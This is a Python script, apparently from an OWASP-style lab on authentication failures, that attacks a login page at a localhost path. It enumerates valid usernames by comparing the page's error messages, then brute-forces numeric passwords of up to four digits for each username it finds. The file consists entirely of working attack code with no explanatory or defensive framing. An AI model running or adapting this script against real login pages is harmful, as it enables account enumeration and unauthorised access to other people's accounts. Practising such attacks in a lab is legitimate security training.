import os
import subprocess
import requests
import itertools

username_length = 2
password_legnth = 4

username_characters = []
for i in range(48, 58):
  username_characters.append(chr(i))
for i in range(65, 91):
  username_characters.append(chr(i))
  username_characters.append(chr(i+32))
# print(username_characters)

password_characters = []
for i in range(48, 58):
  password_characters.append(chr(i))
# print(password_characters)

def crack_password(username):
  for i in range(0, password_legnth):
    for password in itertools.product(password_characters, repeat=i+1):
        temp = requests.post("http://localhost/A07-authenticationFailure/login.php", data={"username": username, "password": ''.join(password)})
        if "Incorrect password" not in temp.text:
          print(f"Possible password for [{username}]: {''.join(password)}")
          return
  return

def crack_username():
  for i in range(0, username_length):
    for username in itertools.product(username_characters, repeat=i+1):
        temp = requests.post("http://localhost/A07-authenticationFailure/login.php", data={"username": ''.join(username), "password": "temp"})
        # print(temp.text)
        if "User doesn't exist" not in temp.text:
          print(f"Possible username: {''.join(username)}")
          crack_password(''.join(username))
  return 

if __name__ == "__main__":
    crack_username()
